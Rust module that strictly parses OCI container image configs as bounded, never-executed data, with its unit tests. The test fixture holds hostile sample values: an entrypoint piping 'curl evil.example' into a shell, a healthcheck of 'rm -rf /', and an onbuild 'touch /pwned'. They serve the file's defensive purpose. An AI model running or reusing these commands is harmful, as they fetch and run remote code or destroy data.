//! The image config as bounded data (VM-W33: "no host execution of image hooks or
//! entrypoints"; §5.2 line 2071 "do not automatically execute tests, hooks, filters or
//! build scripts on the host").
//!
//! Entrypoint, cmd, env, user, working directory, labels, healthcheck, onbuild triggers and
//! shell are recorded as strings for the guest. Nothing here, or anywhere in this module,
//! can start a process: there is no process API to call. Unknown fields are refused, so a
//! hook-like field this parser does not know cannot slip through as ignored data.

use std::collections::{BTreeMap, BTreeSet};
use std::fmt;

use chrono::DateTime;
use serde::{Deserialize, Serialize};

use super::digest::{MediaType, OciDigest, VerifiedBlob};
use super::document::{
    check_annotations, parse_json, AnnotationRefusal, DescriptorAt, DocumentRefusal, Platform,
    StrictMap,
};
use super::limits::{bounded_text, ImportLimits};

/// Why an image config was refused.
#[derive(Clone, Debug, PartialEq, Eq, Serialize)]
#[serde(tag = "reason", rename_all = "snake_case")]
pub enum ConfigRefusal {
    /// The blob is not declared as an image config.
    NotAConfig {
        declared: MediaType,
    },
    Document {
        refusal: DocumentRefusal,
    },
    /// `rootfs.type` is not `layers`.
    RootfsType {
        found: String,
    },
    DiffId {
        index: usize,
        refusal: super::digest::DigestRefusal,
    },
    /// The config lists a different number of diff_ids than the manifest has layers.
    DiffIdCount {
        diff_ids: usize,
        layers: usize,
    },
    /// The config's platform differs from the platform requested.
    PlatformMismatch {
        wanted: Platform,
        found: Platform,
    },
    /// An `Env` entry without `=`.
    EnvEntry {
        index: usize,
    },
    ListTooLong {
        field: &'static str,
        count: usize,
        limit: usize,
    },
    StringTooLong {
        field: &'static str,
        bytes: usize,
        limit: usize,
    },
    Labels {
        refusal: AnnotationRefusal,
    },
    /// `created` is not an RFC 3339 time.
    Created {
        field: &'static str,
    },
    /// History entries that are not empty layers differ in number from the layers.
    HistoryMismatch {
        non_empty: usize,
        layers: usize,
    },
    NegativeValue {
        field: &'static str,
    },
}

impl fmt::Display for ConfigRefusal {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::NotAConfig { declared } => write!(f, "declared {declared}, not a config"),
            Self::Document { refusal } => refusal.fmt(f),
            Self::RootfsType { found } => write!(f, "rootfs type {found:?}; only \"layers\""),
            Self::DiffId { index, refusal } => write!(f, "diff_id {index}: {refusal}"),
            Self::DiffIdCount { diff_ids, layers } => {
                write!(f, "{diff_ids} diff_ids for {layers} layers")
            }
            Self::PlatformMismatch { wanted, found } => {
                write!(f, "the config is for {found}, not {wanted}")
            }
            Self::EnvEntry { index } => write!(f, "Env entry {index} has no '='"),
            Self::ListTooLong {
                field,
                count,
                limit,
            } => write!(f, "{field} has {count} items; at most {limit}"),
            Self::StringTooLong {
                field,
                bytes,
                limit,
            } => write!(f, "{field} has a {bytes}-byte string; at most {limit}"),
            Self::Labels { refusal } => write!(f, "labels: {refusal}"),
            Self::Created { field } => write!(f, "{field} is not an RFC 3339 time"),
            Self::HistoryMismatch { non_empty, layers } => {
                write!(
                    f,
                    "{non_empty} history entries with layers for {layers} layers"
                )
            }
            Self::NegativeValue { field } => write!(f, "{field} is negative"),
        }
    }
}

impl std::error::Error for ConfigRefusal {}

/// How the guest would start the image's process: data for the guest, never run on the
/// host (VM-W33).
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize)]
pub struct ProcessData {
    pub user: Option<String>,
    pub env: Vec<String>,
    pub entrypoint: Vec<String>,
    pub cmd: Vec<String>,
    pub working_dir: Option<String>,
    pub stop_signal: Option<String>,
    pub args_escaped: Option<bool>,
}

/// A healthcheck command, recorded as data (VM-W33).
#[derive(Clone, Debug, PartialEq, Eq, Serialize)]
pub struct HealthcheckData {
    pub test: Vec<String>,
    pub interval_nanos: Option<u64>,
    pub timeout_nanos: Option<u64>,
    pub start_period_nanos: Option<u64>,
    pub start_interval_nanos: Option<u64>,
    pub retries: Option<u64>,
}

/// Hook-like fields: a healthcheck, onbuild triggers and a shell. Recorded as data and
/// never executed on the host (VM-W33; §5.2 line 2071).
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize)]
pub struct HookData {
    pub healthcheck: Option<HealthcheckData>,
    pub on_build: Vec<String>,
    pub shell: Vec<String>,
}

/// One history entry, recorded as data; `created_by` names build commands that ran
/// elsewhere and are never run here.
#[derive(Clone, Debug, PartialEq, Eq, Serialize)]
pub struct HistoryRecord {
    pub created: Option<String>,
    pub created_by: Option<String>,
    pub author: Option<String>,
    pub comment: Option<String>,
    pub empty_layer: bool,
}

/// A checked image config: its platform, diff_ids and bounded data.
#[derive(Clone, Debug, PartialEq, Eq, Serialize)]
pub struct ImageConfigRecord {
    pub platform: Platform,
    pub created: Option<String>,
    pub author: Option<String>,
    pub diff_ids: Vec<OciDigest>,
    pub process: ProcessData,
    pub labels: BTreeMap<String, String>,
    pub exposed_ports: BTreeSet<String>,
    pub volumes: BTreeSet<String>,
    pub hooks: HookData,
    pub memory_bytes: Option<u64>,
    pub memory_swap_bytes: Option<u64>,
    pub cpu_shares: Option<u64>,
    pub history: Vec<HistoryRecord>,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct EmptyObject {}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct RawConfig {
    #[serde(default)]
    created: Option<String>,
    #[serde(default)]
    author: Option<String>,
    architecture: String,
    os: String,
    #[serde(rename = "os.version", default)]
    os_version: Option<String>,
    #[serde(rename = "os.features", default)]
    os_features: Option<Vec<String>>,
    #[serde(default)]
    variant: Option<String>,
    #[serde(default)]
    config: Option<RawExecution>,
    rootfs: RawRootfs,
    #[serde(default)]
    history: Option<Vec<RawHistory>>,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields, rename_all = "PascalCase")]
struct RawExecution {
    #[serde(default)]
    user: Option<String>,
    #[serde(default)]
    exposed_ports: Option<StrictMap<EmptyObject>>,
    #[serde(default)]
    env: Option<Vec<String>>,
    #[serde(default)]
    entrypoint: Option<Vec<String>>,
    #[serde(default)]
    cmd: Option<Vec<String>>,
    #[serde(default)]
    volumes: Option<StrictMap<EmptyObject>>,
    #[serde(default)]
    working_dir: Option<String>,
    #[serde(default)]
    labels: Option<StrictMap<String>>,
    #[serde(default)]
    stop_signal: Option<String>,
    #[serde(default)]
    args_escaped: Option<bool>,
    #[serde(default)]
    memory: Option<i64>,
    #[serde(default)]
    memory_swap: Option<i64>,
    #[serde(default)]
    cpu_shares: Option<i64>,
    #[serde(default)]
    healthcheck: Option<RawHealthcheck>,
    #[serde(default)]
    on_build: Option<Vec<String>>,
    #[serde(default)]
    shell: Option<Vec<String>>,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields, rename_all = "PascalCase")]
struct RawHealthcheck {
    #[serde(default)]
    test: Option<Vec<String>>,
    #[serde(default)]
    interval: Option<i64>,
    #[serde(default)]
    timeout: Option<i64>,
    #[serde(default)]
    start_period: Option<i64>,
    #[serde(default)]
    start_interval: Option<i64>,
    #[serde(default)]
    retries: Option<i64>,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct RawRootfs {
    #[serde(rename = "type")]
    kind: String,
    diff_ids: Vec<String>,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct RawHistory {
    #[serde(default)]
    created: Option<String>,
    #[serde(default)]
    created_by: Option<String>,
    #[serde(default)]
    author: Option<String>,
    #[serde(default)]
    comment: Option<String>,
    #[serde(default)]
    empty_layer: Option<bool>,
}

struct Bounds<'a> {
    limits: &'a ImportLimits,
}

impl Bounds<'_> {
    fn text(
        &self,
        field: &'static str,
        value: Option<String>,
    ) -> Result<Option<String>, ConfigRefusal> {
        match value {
            Some(text) if text.len() > self.limits.max_config_string_bytes => {
                Err(ConfigRefusal::StringTooLong {
                    field,
                    bytes: text.len(),
                    limit: self.limits.max_config_string_bytes,
                })
            }
            other => Ok(other),
        }
    }

    fn list(
        &self,
        field: &'static str,
        value: Option<Vec<String>>,
    ) -> Result<Vec<String>, ConfigRefusal> {
        let items = value.unwrap_or_default();
        if items.len() > self.limits.max_config_items {
            return Err(ConfigRefusal::ListTooLong {
                field,
                count: items.len(),
                limit: self.limits.max_config_items,
            });
        }
        for item in &items {
            self.text(field, Some(item.clone()))?;
        }
        Ok(items)
    }

    fn keys(
        &self,
        field: &'static str,
        value: Option<StrictMap<EmptyObject>>,
    ) -> Result<BTreeSet<String>, ConfigRefusal> {
        let keys: Vec<String> = value
            .map(|map| map.0.into_keys().collect())
            .unwrap_or_default();
        Ok(self.list(field, Some(keys))?.into_iter().collect())
    }

    fn unsigned(field: &'static str, value: Option<i64>) -> Result<Option<u64>, ConfigRefusal> {
        value
            .map(|number| u64::try_from(number).map_err(|_| ConfigRefusal::NegativeValue { field }))
            .transpose()
    }

    fn time(
        &self,
        field: &'static str,
        value: Option<String>,
    ) -> Result<Option<String>, ConfigRefusal> {
        let value = self.text(field, value)?;
        if let Some(text) = &value {
            DateTime::parse_from_rfc3339(text).map_err(|_| ConfigRefusal::Created { field })?;
        }
        Ok(value)
    }
}

/// Parses a verified blob declared as an image config, for the manifest's `layers` count
/// and the requested platform, which the config must equal exactly (VM-W33).
pub fn parse_config(
    blob: &VerifiedBlob,
    layers: usize,
    wanted: &Platform,
    limits: &ImportLimits,
) -> Result<ImageConfigRecord, ConfigRefusal> {
    parse_config_for(blob, layers, Some(wanted), limits)
}

/// The config's diff_ids for a manifest of `layers` layers, whatever its platform; for the
/// verifier, which checks a publisher's image and not a request.
pub(crate) fn config_diff_ids(
    blob: &VerifiedBlob,
    layers: usize,
    limits: &ImportLimits,
) -> Result<Vec<OciDigest>, ConfigRefusal> {
    parse_config_for(blob, layers, None, limits).map(|record| record.diff_ids)
}

fn parse_config_for(
    blob: &VerifiedBlob,
    layers: usize,
    wanted: Option<&Platform>,
    limits: &ImportLimits,
) -> Result<ImageConfigRecord, ConfigRefusal> {
    let declared = blob.reference().media_type;
    if !declared.is_config() {
        return Err(ConfigRefusal::NotAConfig { declared });
    }
    let raw: RawConfig =
        parse_json(blob.bytes(), limits).map_err(|refusal| ConfigRefusal::Document { refusal })?;
    let bounds = Bounds { limits };
    let platform = Platform {
        os: raw.os,
        architecture: raw.architecture,
        variant: raw.variant,
        os_version: raw.os_version,
        os_features: raw.os_features.unwrap_or_default(),
        features: Vec::new(),
    };
    platform
        .check(DescriptorAt::Config, limits)
        .map_err(|refusal| ConfigRefusal::Document { refusal })?;
    if let Some(wanted) = wanted.filter(|wanted| **wanted != platform) {
        return Err(ConfigRefusal::PlatformMismatch {
            wanted: wanted.clone(),
            found: platform,
        });
    }
    if raw.rootfs.kind != "layers" {
        return Err(ConfigRefusal::RootfsType {
            found: bounded_text(&raw.rootfs.kind, 64),
        });
    }
    if raw.rootfs.diff_ids.len() != layers {
        return Err(ConfigRefusal::DiffIdCount {
            diff_ids: raw.rootfs.diff_ids.len(),
            layers,
        });
    }
    let diff_ids = raw
        .rootfs
        .diff_ids
        .iter()
        .enumerate()
        .map(|(index, text)| {
            OciDigest::parse(text).map_err(|refusal| ConfigRefusal::DiffId { index, refusal })
        })
        .collect::<Result<Vec<_>, _>>()?;

    let execution = raw.config;
    let (process, labels, exposed_ports, volumes, hooks, resources) = match execution {
        None => Default::default(),
        Some(execution) => {
            let env = bounds.list("Env", execution.env)?;
            if let Some(index) = env.iter().position(|entry| !entry.contains('=')) {
                return Err(ConfigRefusal::EnvEntry { index });
            }
            let labels = execution.labels.map(|map| map.0).unwrap_or_default();
            check_annotations(&labels, limits)
                .map_err(|refusal| ConfigRefusal::Labels { refusal })?;
            let healthcheck = match execution.healthcheck {
                None => None,
                Some(check) => Some(HealthcheckData {
                    test: bounds.list("Healthcheck.Test", check.test)?,
                    interval_nanos: Bounds::unsigned("Healthcheck.Interval", check.interval)?,
                    timeout_nanos: Bounds::unsigned("Healthcheck.Timeout", check.timeout)?,
                    start_period_nanos: Bounds::unsigned(
                        "Healthcheck.StartPeriod",
                        check.start_period,
                    )?,
                    start_interval_nanos: Bounds::unsigned(
                        "Healthcheck.StartInterval",
                        check.start_interval,
                    )?,
                    retries: Bounds::unsigned("Healthcheck.Retries", check.retries)?,
                }),
            };
            (
                ProcessData {
                    user: bounds.text("User", execution.user)?,
                    env,
                    entrypoint: bounds.list("Entrypoint", execution.entrypoint)?,
                    cmd: bounds.list("Cmd", execution.cmd)?,
                    working_dir: bounds.text("WorkingDir", execution.working_dir)?,
                    stop_signal: bounds.text("StopSignal", execution.stop_signal)?,
                    args_escaped: execution.args_escaped,
                },
                labels,
                bounds.keys("ExposedPorts", execution.exposed_ports)?,
                bounds.keys("Volumes", execution.volumes)?,
                HookData {
                    healthcheck,
                    on_build: bounds.list("OnBuild", execution.on_build)?,
                    shell: bounds.list("Shell", execution.shell)?,
                },
                (
                    Bounds::unsigned("Memory", execution.memory)?,
                    Bounds::unsigned("MemorySwap", execution.memory_swap)?,
                    Bounds::unsigned("CpuShares", execution.cpu_shares)?,
                ),
            )
        }
    };

    let raw_history = raw.history.unwrap_or_default();
    if raw_history.len() > limits.max_config_items {
        return Err(ConfigRefusal::ListTooLong {
            field: "history",
            count: raw_history.len(),
            limit: limits.max_config_items,
        });
    }
    let mut history = Vec::with_capacity(raw_history.len());
    for entry in raw_history {
        history.push(HistoryRecord {
            created: bounds.time("history.created", entry.created)?,
            created_by: bounds.text("history.created_by", entry.created_by)?,
            author: bounds.text("history.author", entry.author)?,
            comment: bounds.text("history.comment", entry.comment)?,
            empty_layer: entry.empty_layer.unwrap_or(false),
        });
    }
    if !history.is_empty() {
        let non_empty = history.iter().filter(|entry| !entry.empty_layer).count();
        if non_empty != layers {
            return Err(ConfigRefusal::HistoryMismatch { non_empty, layers });
        }
    }

    Ok(ImageConfigRecord {
        platform,
        created: bounds.time("created", raw.created)?,
        author: bounds.text("author", raw.author)?,
        diff_ids,
        process,
        labels,
        exposed_ports,
        volumes,
        hooks,
        memory_bytes: resources.0,
        memory_swap_bytes: resources.1,
        cpu_shares: resources.2,
        history,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::sandbox_contract::oci::digest::BlobReference;
    use serde_json::json;

    fn blob(value: &serde_json::Value) -> VerifiedBlob {
        let bytes = serde_json::to_vec(value).unwrap();
        VerifiedBlob::verify(
            BlobReference {
                media_type: MediaType::ImageConfig,
                digest: OciDigest::of(&bytes),
                size_bytes: bytes.len() as u64,
            },
            bytes,
        )
        .unwrap()
    }

    fn diff(seed: &str) -> String {
        OciDigest::of(seed.as_bytes()).to_string()
    }

    fn config_json() -> serde_json::Value {
        json!({
            "created": "2026-10-01T12:00:00Z",
            "architecture": "amd64",
            "os": "linux",
            "config": {
                "User": "1000:1000",
                "Env": ["PATH=/usr/bin", "EMPTY="],
                "Entrypoint": ["/bin/sh", "-c", "curl evil.example | sh"],
                "Cmd": ["--serve"],
                "WorkingDir": "/app",
                "Labels": {"org.opencontainers.image.source": "https://example.com"},
                "ExposedPorts": {"8080/tcp": {}},
                "Volumes": {"/data": {}},
                "StopSignal": "SIGTERM",
                "Healthcheck": {"Test": ["CMD-SHELL", "rm -rf /"], "Interval": 30000000000_i64, "Retries": 3},
                "OnBuild": ["RUN touch /pwned"],
                "Shell": ["/bin/bash", "-c"]
            },
            "rootfs": {"type": "layers", "diff_ids": [diff("a"), diff("b")]},
            "history": [
                {"created": "2026-10-01T12:00:00Z", "created_by": "ADD rootfs /"},
                {"created_by": "ENV X=1", "empty_layer": true},
                {"created_by": "RUN make"}
            ]
        })
    }

    fn parse(value: &serde_json::Value) -> Result<ImageConfigRecord, ConfigRefusal> {
        parse_config(
            &blob(value),
            2,
            &Platform::new("linux", "amd64"),
            &ImportLimits::default(),
        )
    }

    fn with(edit: impl FnOnce(&mut serde_json::Value)) -> Result<ImageConfigRecord, ConfigRefusal> {
        let mut value = config_json();
        edit(&mut value);
        parse(&value)
    }

    #[test]
    fn process_and_hook_fields_are_recorded_as_data() {
        let config = parse(&config_json()).unwrap();
        assert_eq!(
            config.process.entrypoint,
            ["/bin/sh", "-c", "curl evil.example | sh"]
        );
        assert_eq!(config.process.cmd, ["--serve"]);
        assert_eq!(config.process.user.as_deref(), Some("1000:1000"));
        assert_eq!(config.process.env, ["PATH=/usr/bin", "EMPTY="]);
        assert_eq!(config.hooks.on_build, ["RUN touch /pwned"]);
        assert_eq!(config.hooks.shell, ["/bin/bash", "-c"]);
        let healthcheck = config.hooks.healthcheck.unwrap();
        assert_eq!(healthcheck.test, ["CMD-SHELL", "rm -rf /"]);
        assert_eq!(healthcheck.interval_nanos, Some(30_000_000_000));
        assert_eq!(healthcheck.retries, Some(3));
        assert_eq!(
            config.exposed_ports,
            BTreeSet::from(["8080/tcp".to_owned()])
        );
        assert_eq!(config.volumes, BTreeSet::from(["/data".to_owned()]));
        assert_eq!(config.diff_ids.len(), 2);
        assert_eq!(config.history.len(), 3);
    }

    #[test]
    fn unknown_fields_and_hook_lookalikes_are_refused() {
        let edits: [fn(&mut serde_json::Value); 6] = [
            |v: &mut serde_json::Value| v["config"]["PostStart"] = json!(["sh"]),
            |v: &mut serde_json::Value| v["config"]["Hostname"] = json!("x"),
            |v: &mut serde_json::Value| v["hooks"] = json!({}),
            |v: &mut serde_json::Value| v["config"]["Healthcheck"]["Exec"] = json!("sh"),
            |v: &mut serde_json::Value| v["config"]["ExposedPorts"]["80/tcp"] = json!({"x": 1}),
            |v: &mut serde_json::Value| v["rootfs"]["extra"] = json!(1),
        ];
        for edit in edits {
            assert!(matches!(
                with(edit),
                Err(ConfigRefusal::Document {
                    refusal: DocumentRefusal::Malformed { .. }
                })
            ));
        }
    }

    #[test]
    fn the_config_must_describe_the_layers_and_platform() {
        assert_eq!(
            with(|v| v["rootfs"]["type"] = json!("zfs")),
            Err(ConfigRefusal::RootfsType {
                found: "zfs".into()
            })
        );
        assert_eq!(
            with(|v| v["rootfs"]["diff_ids"] = json!([diff("a")])),
            Err(ConfigRefusal::DiffIdCount {
                diff_ids: 1,
                layers: 2
            })
        );
        assert!(matches!(
            with(|v| v["rootfs"]["diff_ids"][1] = json!("sha256:XYZ")),
            Err(ConfigRefusal::DiffId { index: 1, .. })
        ));
        assert_eq!(
            with(|v| v["architecture"] = json!("arm64")),
            Err(ConfigRefusal::PlatformMismatch {
                wanted: Platform::new("linux", "amd64"),
                found: Platform::new("linux", "arm64")
            })
        );
        assert!(matches!(
            with(|v| v["variant"] = json!("v2")),
            Err(ConfigRefusal::PlatformMismatch { .. })
        ));
        assert_eq!(
            with(|v| v["history"][2]["empty_layer"] = json!(true)),
            Err(ConfigRefusal::HistoryMismatch {
                non_empty: 1,
                layers: 2
            })
        );
    }

    #[test]
    fn config_values_are_bounded() {
        assert_eq!(
            with(|v| v["config"]["Env"] = json!(["NOEQUALS"])),
            Err(ConfigRefusal::EnvEntry { index: 0 })
        );
        assert_eq!(
            with(|v| v["created"] = json!("yesterday")),
            Err(ConfigRefusal::Created { field: "created" })
        );
        assert_eq!(
            with(|v| v["config"]["Memory"] = json!(-1)),
            Err(ConfigRefusal::NegativeValue { field: "Memory" })
        );
        let tight = ImportLimits {
            max_config_items: 2,
            max_config_string_bytes: 32,
            ..ImportLimits::default()
        };
        let parse_tight = |value: &serde_json::Value| {
            parse_config(&blob(value), 2, &Platform::new("linux", "amd64"), &tight)
        };
        let mut value = config_json();
        value["history"] = json!([]);
        assert_eq!(
            parse_tight(&value),
            Err(ConfigRefusal::ListTooLong {
                field: "Entrypoint",
                count: 3,
                limit: 2
            })
        );
        value["config"]["Entrypoint"] = json!(["x".repeat(33)]);
        assert_eq!(
            parse_tight(&value),
            Err(ConfigRefusal::StringTooLong {
                field: "Entrypoint",
                bytes: 33,
                limit: 32
            })
        );
        assert!(matches!(
            with(|v| v["config"]["Labels"] = json!({"k": "v".repeat(9000)})),
            Err(ConfigRefusal::Labels { .. })
        ));
    }

    #[test]
    fn docker_style_nulls_are_absent_values() {
        let config = with(|v| {
            v["config"]["Entrypoint"] = json!(null);
            v["config"]["OnBuild"] = json!(null);
        })
        .unwrap();
        assert!(config.process.entrypoint.is_empty());
        assert!(config.hooks.on_build.is_empty());
    }
}
